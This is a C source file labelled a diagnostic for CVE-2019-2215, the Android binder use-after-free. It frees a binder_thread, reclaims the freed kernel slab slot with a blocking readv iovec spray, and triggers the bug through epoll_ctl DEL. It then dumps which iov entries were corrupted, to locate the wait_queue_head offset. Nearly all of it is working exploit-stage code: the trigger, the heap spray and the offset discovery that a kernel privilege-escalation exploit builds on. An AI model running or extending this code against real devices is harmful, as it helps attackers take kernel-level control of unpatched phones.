/*
 * binder_uaf_diag.c — CVE-2019-2215 UAF diagnostic
 *
 * Tests whether blocking readv with iovec array can reclaim the freed
 * binder_thread slot, and whether epoll_ctl DEL's list_del modifies
 * the reclaimed iov entries.
 *
 * Technique: Use readv blocked on empty pipe → iov array persists in
 * kmalloc-512. After list_del, write to pipe → readv completes.
 * Check which buffers got data vs. which were corrupted.
 */
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define NUM_IOV_512  64   /* 64 * 8 = 512 bytes for kmalloc-512 */
#define NUM_IOV_256  32   /* 32 * 8 = 256 bytes for kmalloc-256 */
#define CANARY       0xDEADBEEF
#define BUF_PER_IOV  16   /* bytes per iov entry */

struct diag_args {
    int pipe_rd;
    struct iovec *iov;
    int iovcnt;
    volatile int readv_started;
    volatile int readv_done;
    ssize_t readv_result;
    int readv_errno;
};

static void *readv_thread(void *arg) {
    struct diag_args *a = (struct diag_args *)arg;
    a->readv_started = 1;
    a->readv_result = readv(a->pipe_rd, a->iov, a->iovcnt);
    a->readv_errno = errno;
    a->readv_done = 1;
    return NULL;
}

static void read_slabinfo(const char *label, const char *cache) {
    char line[512];
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, cache)) {
            printf("  [%s] %s", label, line);
            break;
        }
    }
    fclose(f);
}

/*
 * Run one diagnostic pass.
 * is_k256: if true, use 256-byte iov (32 entries), else 512-byte (64 entries)
 * use_two_epolls: if true, register with two epolls
 * Returns: detected wait_queue offset, or -1
 */
static int run_diag(int is_k256, int use_two_epolls) {
    int iovcnt = is_k256 ? NUM_IOV_256 : NUM_IOV_512;
    int slab_size = is_k256 ? 256 : 512;

    printf("\n=== Diagnostic: kmalloc-%d, %s ===\n",
           slab_size, use_two_epolls ? "2 epolls" : "1 epoll");

    /* Allocate user buffers for each iov entry, fill with canary */
    uint8_t *bufs[NUM_IOV_512];
    for (int i = 0; i < iovcnt; i++) {
        bufs[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memset(bufs[i], 0xCC, 4096);
        /* Write canary at start */
        *(uint32_t*)bufs[i] = CANARY;
    }

    /* Set up iov: each entry reads BUF_PER_IOV bytes into separate buffer */
    struct iovec iov[NUM_IOV_512];
    for (int i = 0; i < iovcnt; i++) {
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = BUF_PER_IOV;
    }

    /* Create empty pipe for blocking readv */
    int pfd[2];
    pipe(pfd);

    /* Open binder */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return -1; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    uint32_t zero = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &zero);

    /* Add to epoll(s) → creates binder_thread */
    int epfd1 = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd1, EPOLL_CTL_ADD, binder_fd, &ev);

    int epfd2 = -1;
    if (use_two_epolls) {
        epfd2 = epoll_create1(0);
        epoll_ctl(epfd2, EPOLL_CTL_ADD, binder_fd, &ev);
    }

    read_slabinfo("before free", is_k256 ? "kmalloc-256" : "kmalloc-512");

    /* FREE the binder_thread */
    int32_t dummy = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy);
    printf("  binder_thread freed via THREAD_EXIT\n");

    read_slabinfo("after free", is_k256 ? "kmalloc-256" : "kmalloc-512");

    /* Start blocking readv to reclaim the freed slot */
    struct diag_args args = {
        .pipe_rd = pfd[0],
        .iov = iov,
        .iovcnt = iovcnt,
        .readv_started = 0,
        .readv_done = 0,
    };

    pthread_t tid;
    pthread_create(&tid, NULL, readv_thread, &args);

    /* Wait for readv to start (and hopefully reclaim the slab) */
    while (!args.readv_started) usleep(100);
    usleep(50000); /* 50ms for reclaim to happen */

    read_slabinfo("after readv", is_k256 ? "kmalloc-256" : "kmalloc-512");

    printf("  readv blocking (iov in kernel kmalloc-%d)\n", slab_size);
    printf("  Triggering ep_unregister_pollwait via epoll_ctl DEL...\n");

    /* Trigger the UAF: ep_unregister_pollwait → list_del on freed memory */
    epoll_ctl(epfd1, EPOLL_CTL_DEL, binder_fd, &ev);

    if (use_two_epolls) {
        printf("  Triggering second epoll DEL...\n");
        epoll_ctl(epfd2, EPOLL_CTL_DEL, binder_fd, &ev);
    }

    /* Now write data to the pipe → readv unblocks */
    int total_write = iovcnt * BUF_PER_IOV;
    uint8_t *wdata = malloc(total_write);
    /* Fill write data with recognizable pattern: each 16 bytes has the index */
    for (int i = 0; i < iovcnt; i++) {
        memset(wdata + i * BUF_PER_IOV, (uint8_t)(i + 1), BUF_PER_IOV);
    }

    printf("  Writing %d bytes to pipe...\n", total_write);
    int written = 0;
    while (written < total_write) {
        int w = write(pfd[1], wdata + written, total_write - written);
        if (w <= 0) break;
        written += w;
    }
    printf("  Wrote %d bytes\n", written);

    /* Wait for readv to complete */
    usleep(100000); /* 100ms */
    if (!args.readv_done) {
        printf("  readv still blocking, writing more...\n");
        write(pfd[1], wdata, total_write);
        usleep(200000);
    }

    if (args.readv_done) {
        printf("  readv returned: %zd (errno=%d)\n",
               args.readv_result, args.readv_errno);
    } else {
        printf("  readv still blocked after 300ms!\n");
        /* Cancel - close the pipe */
        close(pfd[1]);
        usleep(100000);
        printf("  After closing write end: readv_done=%d result=%zd errno=%d\n",
               args.readv_done, args.readv_result, args.readv_errno);
    }

    /* Analyze results: check each buffer for data or corruption */
    printf("\n  --- IOV Entry Analysis ---\n");
    int first_bad = -1;
    int last_good = -1;
    for (int i = 0; i < iovcnt; i++) {
        uint32_t first_word = *(uint32_t*)bufs[i];
        int got_data = (first_word != CANARY);
        int expected_byte = (uint8_t)(i + 1);
        int correct_data = (bufs[i][0] == expected_byte);

        if (got_data && correct_data) {
            last_good = i;
        } else if (got_data && !correct_data) {
            if (first_bad == -1) first_bad = i;
            printf("  iov[%d]: UNEXPECTED data! first_word=0x%08x (expected 0x%02x%02x%02x%02x)\n",
                   i, first_word,
                   expected_byte, expected_byte, expected_byte, expected_byte);
        } else {
            if (first_bad == -1) first_bad = i;
        }
    }

    printf("  Last entry with correct data: iov[%d]\n", last_good);
    printf("  First entry without correct data: iov[%d]\n", first_bad);

    if (first_bad >= 0) {
        /* The corrupted entry's iov_base or iov_len was overwritten by list_del.
         * iov entry i covers bytes [i*8, i*8+7] in the kmalloc buffer.
         * iov_base at i*8+0, iov_len at i*8+4.
         * wait_queue_head_t = { spinlock(4), list_head(8) }
         * list_del writes to head.list_head.next (wait_off+4) and .prev (wait_off+8)
         * So if iov[N] is first corrupted:
         *   - corruption at byte N*8
         *   - wait_queue_head starts at N*8 - 4 (if next field at N*8)
         *   or wait_queue_head starts at N*8 - 0 (if lock at N*8)
         */
        int byte_off = first_bad * 8;
        printf("\n  ** Corruption detected at byte offset %d (iov[%d]) **\n",
               byte_off, first_bad);
        printf("  Possible wait_queue_head offsets: %d or %d\n",
               byte_off - 4, byte_off);
        printf("  (wait_queue_head = lock(4) + list_head.next(4) + list_head.prev(4))\n");
    } else {
        printf("\n  ** No corruption detected — spray may not have reclaimed the slot **\n");
    }

    /* Print details of entries around corruption point */
    if (first_bad > 0) {
        printf("\n  Detailed dump around corruption:\n");
        int start = (first_bad > 3) ? first_bad - 3 : 0;
        int end = (first_bad + 5 < iovcnt) ? first_bad + 5 : iovcnt;
        for (int i = start; i < end; i++) {
            printf("  iov[%2d] (off %3d): ", i, i * 8);
            for (int j = 0; j < BUF_PER_IOV && j < 8; j++)
                printf("%02x ", bufs[i][j]);
            uint32_t w = *(uint32_t*)bufs[i];
            printf(" | first_word=0x%08x %s\n", w,
                   (w == CANARY) ? "(CANARY-untouched)" :
                   (bufs[i][0] == (uint8_t)(i+1)) ? "(correct)" : "(CORRUPTED)");
        }
    }

    /* Cleanup */
    pthread_join(tid, NULL);
    close(binder_fd);
    close(epfd1);
    if (epfd2 >= 0) close(epfd2);
    close(pfd[0]);
    close(pfd[1]);
    free(wdata);
    for (int i = 0; i < iovcnt; i++) munmap(bufs[i], 4096);

    return first_bad >= 0 ? first_bad * 8 : -1;
}

/* Test: does allocating N iov entries of size S actually hit kmalloc-S? */
static void slab_verification(void) {
    printf("=== Slab Verification ===\n");
    printf("Testing if readv iov array lands in expected kmalloc cache...\n\n");

    /* Check baseline */
    read_slabinfo("baseline", "kmalloc-512");
    read_slabinfo("baseline", "kmalloc-256");
    read_slabinfo("baseline", "kmalloc-64");

    int pipes[100][2];
    pthread_t tids[100];
    struct diag_args args[100];
    struct iovec iovs[100][NUM_IOV_512];
    uint8_t dummy_bufs[100][16];

    for (int i = 0; i < 100; i++) {
        pipe(pipes[i]);
        for (int j = 0; j < NUM_IOV_512; j++) {
            iovs[i][j].iov_base = dummy_bufs[i];
            iovs[i][j].iov_len = 1;
        }
        args[i].pipe_rd = pipes[i][0];
        args[i].iov = iovs[i];
        args[i].iovcnt = NUM_IOV_512;
        args[i].readv_started = 0;
        args[i].readv_done = 0;
        pthread_create(&tids[i], NULL, readv_thread, &args[i]);
        while (!args[i].readv_started) usleep(10);
    }
    usleep(100000);

    printf("\nAfter 100 blocking readvs (64 iovecs each = 512 bytes):\n");
    read_slabinfo("after 100", "kmalloc-512");
    read_slabinfo("after 100", "kmalloc-256");
    read_slabinfo("after 100", "kmalloc-64");

    /* Cleanup */
    for (int i = 0; i < 100; i++) {
        close(pipes[i][1]); /* close write end → readv returns */
    }
    usleep(200000);
    for (int i = 0; i < 100; i++) {
        pthread_join(tids[i], NULL);
        close(pipes[i][0]);
    }
    printf("\n");
}

int main(void) {
    printf("=== CVE-2019-2215 UAF Diagnostic ===\n\n");

    /* First verify slab behavior */
    slab_verification();

    /* Try diagnostic with different configs */
    int result;

    result = run_diag(0, 0);  /* kmalloc-512, 1 epoll */
    if (result >= 0)
        printf("\n  >>> WAIT_QUEUE_HEAD likely at offset %d or %d <<<\n",
               result - 4, result);

    result = run_diag(1, 0);  /* kmalloc-256, 1 epoll */
    if (result >= 0)
        printf("\n  >>> WAIT_QUEUE_HEAD likely at offset %d or %d <<<\n",
               result - 4, result);

    result = run_diag(0, 1);  /* kmalloc-512, 2 epolls */
    if (result >= 0)
        printf("\n  >>> WAIT_QUEUE_HEAD likely at offset %d or %d <<<\n",
               result - 4, result);

    printf("\n=== Diagnostic Complete ===\n");
    return 0;
}
